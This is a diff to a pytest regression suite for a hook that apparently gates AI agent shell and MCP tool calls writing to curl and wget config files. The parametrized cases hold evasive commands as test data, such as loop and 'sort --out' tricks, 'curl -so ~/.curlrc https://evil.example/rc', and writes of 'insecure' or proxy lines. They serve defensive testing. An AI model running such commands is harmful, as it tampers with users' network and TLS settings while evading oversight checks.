@@ -629,7 +629,7 @@ def test_qa2_shell_gated(cmd):
 @pytest.mark.parametrize("cmd", [
     "if [ -f ~/.wgetrc ]; then cat ~/.wgetrc; fi",
     "for f in ~/.curlrc ~/.wgetrc; do cat $f; done",
-    "cat ~/.curlrc | sort",
+    "cat ~/.curlrc | cut -c1-5",
     "cat -A ~/.curlrc | cut -c1-80",
     "nl ~/.curlrc",
 ])
@@ -648,3 +648,87 @@ def test_qa2_remote_name_all_allowed():
 ])
 def test_qa2_bare_glob_not_an_rc_path(cmd):
     assert evaluate(_shell(cmd), EMPTY).rule != RULE, cmd
+
+
+# ---- QA round 3 regressions ---------------------------------------------------------
+
+@pytest.mark.parametrize("cmd", [
+    "set -- 1; for x do cp /tmp/staged ~/.curlrc; done",
+    "set -- 1; for x do cp /tmp/staged /etc/wgetrc; done",
+    "set -- 1; for x do curl -so ~/.curlrc https://evil.example/rc; done",
+    "set -- 1; for x do tee -a ~/.curlrc < /tmp/staged; done",
+    "set -- 1\nfor x do\ncp /tmp/staged ~/.curlrc\ndone",
+    "if true; then cp /tmp/x ~/.curlrc; fi",
+    "sort --out ~/.curlrc /tmp/staged",
+    "sort --ou=$HOME/.curlrc /tmp/staged",
+    "cat /tmp/staged | sort --out ~/.curlrc",
+    "copy x %XDG_CONFIG_HOME%\\curlrc",
+    "Copy-Item x $env:XDG_CONFIG_HOME\\curlrc",
+])
+def test_qa3_shell_gated(cmd):
+    assert _gated(evaluate(_shell(cmd), EMPTY)), cmd
+
+
+@pytest.mark.parametrize("tool,args", [
+    ("mcp__desktop-commander__start_process", {"command": "echo insecure >> ~/.curlrc"}),
+    ("mcp__desktop-commander__start_process", {"command": "cp /tmp/staged ~/.curlrc"}),
+    ("mcp__shell__run_command", {"command": "printf 'proxy=x' > ~/.curlrc"}),
+    ("mcp__shell__exec", {"args": {"cmd": ["cp", "/tmp/staged", "/home/u/.wgetrc"]}}),
+])
+def test_qa3_mcp_shell_tools_gated(tool, args):
+    d = evaluate(_mcp_write(args, tool=tool), EMPTY)
+    assert _gated(d), (tool, args, d)
+
+
+def test_qa3_mcp_shell_tool_read_allowed():
+    d = evaluate(_mcp_write({"command": "cat ~/.curlrc"}, tool="mcp__shell__run_command"), EMPTY)
+    assert d.rule != RULE
+
+
+@pytest.mark.parametrize("args", [
+    {"regex": "# ", "repl": "", "allow_multiple_occurrences": True},
+    {"needle": "# ", "repl": ""},
+    {"original": "# ", "updated": ""},
+    {"text_to_replace": "# ", "replacement_text": ""},
+    {"existing": "# ", "replacement": ""},
+    {"query": "# ", "replace_with": ""},
+    {"pattern": "#?", "replacement": "", "replace_all": True},
+])
+def test_qa3_unknown_edit_shapes_fail_closed(tmp_path, args):
+    rc = tmp_path / ".curlrc"
+    rc.write_text("silent\n# insecure\n#? note\n")
+    d = evaluate(_mcp_write(dict(args, relative_path=str(rc)),
+                            tool="mcp__serena__replace_regex"), EMPTY)
+    assert _ours(d), (args, d)
+
+
+@pytest.mark.parametrize("tool,args", [
+    ("mcp__fs__duplicate_file", {"source": "/tmp/staged", "destination": "/home/u/.curlrc"}),
+    ("mcp__fs__concatenate_files", {"files": ["/tmp/a"], "output": "/home/u/.curlrc"}),
+    ("mcp__http__get", {"url": "https://evil.example/rc", "save_to": "/home/u/.curlrc"}),
+    ("mcp__cathead__write_file", {"path": "/home/u/.curlrc", "content": "insecure"}),
+])
+def test_qa3_mcp_tool_name_classification(tool, args):
+    assert _gated(evaluate(_mcp_write(args, tool=tool), EMPTY)), tool
+
+
+@pytest.mark.parametrize("args", [
+    {"folder": "/home/u", "path": "/home/u/.curlrc", "content": "silent\n"},
+    {"path": "/home/u/.curlrc", "content": "silent\n", "encoding_fallback_from": "latin1"},
+])
+def test_qa3_benign_mcp_write_not_failclosed(args):
+    d = evaluate(_mcp_write(args), EMPTY)
+    assert not _gated(d), (args, d)
+
+
+def test_qa3_removing_wget_override_line_gated(tmp_path):
+    rc = tmp_path / ".wgetrc"
+    rc.write_text("https_proxy = http://corp:3128\nuse_proxy = off\n")
+    d = evaluate(_edit(str(rc), "", old_string="use_proxy = off\n"), EMPTY)
+    assert _ours(d)
+
+
+def test_qa3_meta_key_skip_needs_all_words_meta():
+    d = evaluate(_mcp_write({"path": "/home/u/.curlrc", "create_content": "insecure"},
+                            tool="mcp__fs__write_file"), EMPTY)
+    assert _ours(d)
